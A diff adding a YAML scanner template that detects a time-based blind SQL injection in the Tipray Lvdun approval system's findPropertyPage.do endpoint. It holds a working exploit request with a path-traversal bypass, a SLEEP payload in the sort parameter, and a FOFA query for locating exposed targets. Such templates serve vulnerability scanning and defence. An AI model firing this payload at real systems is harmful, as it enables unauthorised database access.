@@ -1,0 +1,20 @@
+id: poc-yaml-tipray-gsas-findpropertypage-do-sqli
+info:
+  name: 天锐绿盾审批系统 findPropertyPage.do SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 天锐绿盾审批系统
+  fofa: app="TIPPAY-绿盾审批系统"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: POST
+  path: /trwfe/login.jsp/.%2e/invoker/findPropertyPage.do
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: tenantId=1&categoryId=1&sort=id%20OR+(SELECT+1337+FROM+(SELECT(SLEEP({{.t1}})))test)&order=asc
+  expression: status_code == 200 && contains(body,`{"total":0,"rows":[]}`) && !contains(body,"<")
+    && duration > t1 && duration < t2
+transport: http
